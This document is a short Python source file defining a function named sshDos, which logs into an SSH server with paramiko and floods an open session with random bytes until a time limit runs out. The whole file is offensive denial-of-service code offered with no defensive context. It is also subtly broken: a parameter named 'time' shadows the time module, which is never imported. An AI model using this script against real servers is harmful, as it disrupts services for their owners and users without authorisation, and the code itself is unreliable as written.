import paramiko
import os


def sshDos(host, port, user, sock, password, time):
    start_time = time.time()

    try:
        sock.connect((host, int(port)))
        para = paramiko.Transport(sock)
        para.local_version = "SSH-2.0-Blabla"
    except paramiko.SSHException:
        print("[-] Unable to connect to host")
        exit(1)

    channel = ""

    try:
        para.connect(username=user, password=password)
    except paramiko.SSHException as e:
        print(e)

    try:
        channel = para.open_session()
    except paramiko.SSHException as e:
        print(e)

    send_bytes = os.urandom(1490)

    while time.time() - start_time < time:
        channel.sendall(send_bytes)

    para.close()
    sock.close()
